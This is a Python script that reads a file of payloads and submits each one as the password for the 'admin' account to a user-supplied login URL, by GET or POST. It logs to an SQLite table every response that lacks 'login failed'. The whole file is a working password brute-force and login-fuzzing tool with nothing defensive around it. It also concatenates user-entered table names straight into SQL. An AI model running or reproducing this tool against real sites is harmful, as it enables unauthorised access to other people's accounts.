#!/usr/bin/python3

import sqlite3
import requests as req
from myinit import *
import myprint
from os import listdir
from os.path import isfile, join

def start():
    global url
    global table_name
    global db_file_name
    global payload_path
    global want_question
    global payload_file

    if want_question:
        ip = input('Do you want question?(y,n): ')
        if ip.lower()=='n':
            want_question = False

    if want_question:
        ip = input('Enter URL : ')
        if ip != '':
            url = ip
        ip = input("Enter table name to save : ")
        if ip != '':
            table_name = ip
        onlyfiles = [f for f in listdir(payload_path) if isfile(join(payload_path, f))]
        len_onlyfiles = len(onlyfiles)
        print("Existing payloads file from",payload_path)
        for i in range(len_onlyfiles):
            print(i,">",onlyfiles[i])
        if want_question:
            ip = input("Enter payload file name : ")
            if ip != '':
                if ip.isnumeric():
                    ip = int(ip)
                    if ip < len_onlyfiles and isfile(join(payload_path,onlyfiles[ip])):
                        payload_file = join(payload_path,onlyfiles[ip])
                    else:
                        print('Not found (using default file [',payload_file,'])')
                else:
                    if isfile(join(payload_path,ip)):
                        payload_file = join(payload_path,ip)
                    else:
                        print('Not found (using default file [',payload_file,'])')
    

def myget():
    global table_name
    global payload_file
    global db_file_name

    conn=sqlite3.connect(db_file_name+'.sqlite')
    cur =conn.cursor()

    if not db_append_mode:
        cur.execute('drop table if exists '+table_name)
        cur.execute('CREATE TABLE '+table_name+''' (
            id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            method char(20),
            length INTEGER,
            payload TEXT,
            parameter TEXT UNIQUE
            );
        ''')
    fh = open(payload_file)
    s = req.session()
    try:
        for line in fh:
            line = line.strip()
            parameter='?uname='+'admin'+'&psw='+line
            print(parameter)
            default_keyword='login failed'
            r = s.get(url+parameter)
            # print(r.text)
            if r.status_code!=404 and default_keyword not in r.text:
                len_response=len(r.text)
                print("found:",line,len_response)
                print()
                cur.execute('INSERT OR IGNORE INTO '+table_name+'(parameter,method,payload,length) values(?,?,?,?)',(parameter[1:],'GET',line,len_response))
                conn.commit()
    except:
        print('Error')

def mypost():
    global table_name
    global payload_file
    global db_file_name

    conn=sqlite3.connect(db_file_name+'.sqlite')
    cur =conn.cursor()

    if not db_append_mode:
        cur.execute('drop table if exists '+table_name)
        cur.execute('CREATE TABLE '+table_name+''' (
            id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            method char(20),
            length INTEGER,
            payload TEXT,
            parameter TEXT UNIQUE
            );
        ''')
    fh = open(payload_file)
    try:
        for line in fh:
            line = line.strip()
            parameter={'uname':'admin','psw':line}
            print(parameter)
            default_keyword='login failed'
            r = req.post(url,data=parameter)
            # print(r.text)
            if r.status_code!=404 and default_keyword not in r.text:
                len_response=len(r.text)
                print("found:",line,len_response)
                print()
                cur.execute('INSERT OR IGNORE INTO '+table_name+'(parameter,method,payload,length) values(?,?,?,?)',(str(parameter),'POST',line,len_response))
                conn.commit()
    except:
        print('Error')

if __name__ == "__main__":
    start()
    mypost()
    global table_name
    myprint.print_all(table_name)